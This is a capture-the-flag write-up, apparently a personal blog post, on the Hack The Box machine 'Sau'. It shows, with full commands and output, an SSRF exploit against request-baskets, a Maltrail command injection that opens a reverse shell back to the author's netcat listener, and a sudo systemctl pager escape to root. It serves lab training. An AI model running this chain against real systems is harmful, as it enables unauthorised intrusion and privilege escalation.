---
title: "HTB: Sau"
date: 2025-02-05
draft: false
summary: HTB Easy Difficulty Linux Machine.
tags:
  - linux
  - easy
category: HTB
---
#### Box Information
- **Creator**: sau123
- **Release Date**: 08 Jul, 2023
- **OS**: Linux
- **Difficulty**: Easy

This machine starts by exploiting a SSRF vulnerability to discover another service running locally, which has a command injection that gives the foothold to the machine. There is a Sudo misconfiguration for a binary that has a CVE, escalating to root.

#### Recon
###### Nmap
I start this machine by doing a port scan with **Nmap**,  and found two ports open. The first is SSH at port 22 and an unknown service which seems to be a web page at port 55555.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ sudo nmap -p- --min-rate 10000 10.10.11.224
[sudo] password for chronopad:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 19:11 WIB
Warning: 10.10.11.224 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.224
Host is up (5.9s latency).
Not shown: 41339 closed tcp ports (reset), 24194 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
55555/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 95.19 seconds

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ sudo nmap -p 22,55555 -sCV 10.10.11.224
[sudo] password for chronopad:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 19:35 WIB
Nmap scan report for 10.10.11.224
Host is up (0.42s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 05 Feb 2025 12:35:56 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 05 Feb 2025 12:35:08 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 05 Feb 2025 12:35:12 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=2/5%Time=67A35AFE%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html
SF:;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2005\x20Feb\x
SF:202025\x2012:35:08\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"
SF:/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2
SF:0200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2005\x20Feb\x
SF:202025\x2012:35:12\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nDate:\x20Wed,\x2005\x20Feb\x202025\x2012:35:56\x20GMT
SF:\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20n
SF:ame\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\
SF:$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.28 seconds
```

###### Website enumeration
The website at port 55555 appears to be providing a service where we can create a basket that can receive and log the requests made to the basket, something like webhook.site and requestcatcher.com.

![Image Description](/images/Pasted%20image%2020250205204021.png)

![Image Description](/images/Pasted%20image%2020250205203940.png)

#### Shell as puma
###### SSRF to RCE
In the footer of the page, I see that it is running `request-baskets 1.2.1`. When I google to check if the version has any vulnerability, I came across [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163), which shows that this version is vulnerable to SSRF. I also found this [exploit PoC](https://github.com/entr0pie/CVE-2023-27163).

I downloaded the exploit PoC and tried it to make a request to my self-hosted Python server, and it works.

```
# Terminal 1
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://10.10.16.4:8000
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "ljrzba" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/ljrzba now makes the server request to http://10.10.16.4:8000.
> Authorization: Y_smT_xjOpbAa6_1RyTrQdA7KMC-mxQP5KzIgtTNWErE

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ curl http://10.10.11.224:55555/ljrzba
...SNIP...

# Terminal 2
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.224 - - [05/Feb/2025 20:46:49] "GET / HTTP/1.1" 200 -
```

Now that I have a working SSRF, the first thing I do is to try to access any web servers that are only available locally on the machine. I will try the common ports for web servers first, like port 80, port 8080, port 8000, etc. 

I found that there is a website running locally on port 80. The footer of the page shows that website runs `Maltrail v0.53`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "lqhcdo" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/lqhcdo now makes the server request to http://127.0.0.1:80.
> Authorization: OqWe8UtOFhF3-NAEe_duVBSeGi-2dYfjjfJYFHSPrewk

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ curl http://10.10.11.224:55555/lqhcdo
...SNIP...
        <div id="bottom_blank"></div>
        <div class="bottom noselect">Powered by <b>M</b>altrail (v<b>0.53</b>)</div>
...SNIP...
```

When I google for any vulnerability in the specified version, I found that there is an unauthenticated OS command injection vulnerability, which should allow us to get a shell on the machine. I found this [exploit PoC](https://github.com/spookier/Maltrail-v0.53-Exploit).

The vulnerability is in the */login* page, so I ran the first SSRF exploit to target the *http://127.0.0.1:80/login*. I then modified the second RCE exploit to target the given URL directly (because it already points to */login*). This results in a successful reverse shell, giving me a shell as the user `puma`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "qygopp" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/qygopp now makes the server request to http://127.0.0.1:80/login.
> Authorization: r2B36xhLg7sox88CJvfokb0_uZR5cgbhNlncXT944Vf5

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ python3 exploit.py 10.10.16.4 1337 http://10.10.11.224:55555/qygopp
Running exploit on http://10.10.11.224:55555/qygopp
Login failed
```

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.224] 57082
$ whoami
whoami
puma
```

#### Shell as root
###### Shell enumeration
The first thing I do is to upgrade the shell to be more interactive. Here's the sequence of commands that I usually run to do it.

```
$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
puma@sau:~$ ^Z
[1]+  Stopped                 nc -lvnp 1337

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sau-linux]
└─$ stty raw -echo; fg
nc -lvnp 1337
             whoami
puma
puma@sau:~$
```

I found that the user has a Sudo permission to run `/usr/bin/systemctl status trail.service`, which should be the privilege escalation vector to focus on.

```
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
puma@sau:~$
```

###### systemctl status PE
I browsed for anything that I can do with `systemctl status`, and I found these following links:
- https://vigilance.fr/vulnerability/systemd-privilege-escalation-via-Systemctl-Status-Less-40889
- https://nvd.nist.gov/vuln/detail/CVE-2023-26604
- https://sploitus.com/exploit?id=EDB-ID:51674

Based on reading the articles, I found that `systemctl status [any service]` will output the result using `less`, which can be used to execute system commands. Since we are running with Sudo, this means that we can use the `less` to privilege escalate to `root`. Successfully obtained shell as `root` by running `!/bin/bash`.

```
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Wed 2025-02-05 12:10:24 UTC; 2h 30min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 896 (python3)
      Tasks: 12 (limit: 4662)
     Memory: 208.6M
     CGroup: /system.slice/trail.service
             ├─ 896 /usr/bin/python3 server.py
             ├─1200 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed p>
             ├─1202 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed p>
             ├─1205 sh
             ├─1211 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1212 /bin/sh
             ├─1429 script /dev/null -c bash
             ├─1430 bash
             ├─1486 sudo /usr/bin/systemctl status trail.service
             ├─1487 /usr/bin/systemctl status trail.service
             └─1488 pager

Feb 05 14:28:36 sau sudo[1456]: pam_unix(sudo:auth): authentication failure; lo>
Feb 05 14:28:39 sau sudo[1456]: pam_unix(sudo:auth): conversation failed
lines 1-23!//bbiinn//bbaasshh!/bin/bash
root@sau:/opt/maltrail#
```
